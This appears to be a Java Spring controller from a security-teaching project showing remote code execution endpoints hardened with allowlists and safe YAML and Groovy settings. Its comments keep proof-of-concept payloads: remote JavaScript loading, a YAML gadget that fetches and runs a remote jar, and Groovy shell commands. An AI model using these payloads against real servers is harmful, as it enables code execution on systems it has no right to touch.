package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.codehaus.groovy.syntax.Types;
import org.joychou.security.SecurityUtil;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.math.BigDecimal;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.Collections;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final String ERROR_MESSAGE = "Command exec failed!!";

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            String[] argv = SecurityUtil.parseAllowedCommand(cmd);
            if (argv == null) {
                return "Command not allowed!!";
            }
            Process p = run.exec(argv);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            log.error("Command exec failed: {}", e.getClass().getSimpleName());
            return ERROR_MESSAGE;
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        try {
            String[] arrCmd = SecurityUtil.parseAllowedCommand(cmd);
            if (arrCmd == null) {
                return "Command not allowed!!";
            }
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            log.error("Command exec failed: {}", e.getClass().getSimpleName());
            return ERROR_MESSAGE;
        }

        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        // Only load scripts from allowlisted domains; pass the URL as data, not as script source.
        String safeUrl = SecurityUtil.checkURL(jsurl);
        if (safeUrl == null) {
            throw new IllegalArgumentException("jsurl is not allowed");
        }
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        bindings.put("jsurl", safeUrl);
        engine.eval("load(jsurl)", bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        // SafeConstructor only builds standard YAML types; arbitrary class tags are rejected.
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        // The request value is only a lookup key; only predefined script literals are evaluated.
        String script = predefinedScript(content);
        if (script == null) {
            throw new IllegalArgumentException("script not allowed");
        }
        // Only plain numeric arithmetic is accepted: no method calls on other types, imports,
        // string literals, closures or class/method definitions.
        SecureASTCustomizer customizer = new SecureASTCustomizer();
        customizer.setMethodDefinitionAllowed(false);
        customizer.setClosuresAllowed(false);
        customizer.setPackageAllowed(false);
        customizer.setIndirectImportCheckEnabled(true);
        customizer.setImportsWhitelist(Collections.<String>emptyList());
        customizer.setStarImportsWhitelist(Collections.<String>emptyList());
        customizer.setStaticImportsWhitelist(Collections.<String>emptyList());
        customizer.setStaticStarImportsWhitelist(Collections.<String>emptyList());
        customizer.setReceiversClassesWhiteList(Arrays.<Class>asList(Integer.class, Integer.TYPE));
        customizer.setConstantTypesClassesWhiteList(Arrays.<Class>asList(
                Integer.class, Integer.TYPE, Long.class, Long.TYPE, BigDecimal.class));
        customizer.setTokensWhitelist(Arrays.asList(
                Types.PLUS, Types.MINUS, Types.MULTIPLY, Types.DIVIDE, Types.MOD));
        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(customizer);
        GroovyShell groovyShell = new GroovyShell(config);
        groovyShell.evaluate(script);
    }

    private static String predefinedScript(String key) {
        if (key == null) {
            return null;
        }
        switch (key) {
            case "sum":
                return "1 + 2";
            case "product":
                return "6 * 7";
            default:
                return null;
        }
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

